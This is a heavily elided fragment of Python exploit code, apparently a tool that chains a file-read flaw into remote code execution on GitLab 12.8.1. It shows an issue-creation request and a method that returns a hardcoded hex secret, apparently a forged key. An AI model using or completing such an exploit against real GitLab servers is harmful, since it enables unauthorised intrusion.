...
class GitlabRCE:
    ...
    def create_issue(self, project_id, text):
        ...
        data = {"authenticity_token": authenticity_token, "issue[title]": issue_title, "issue[description]": text,'issue[confidential]' : '0','issue[assignee_ids][]' : '0','issue[label_ids][]' : '','issue[due_date]' : '','issue[lock_version]' : '0'}
        print(issue_link)
        print("sleeping...")
        # time.sleep(100000)
        result = self.session.post(issue_link, data=data, allow_redirects=False)
        print(result)
...
class GitlabRCE1281RCE(GitlabRCE1281LFI):
    ...
    def parse_secrets(self, secrets):
        ...
        return "3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3"
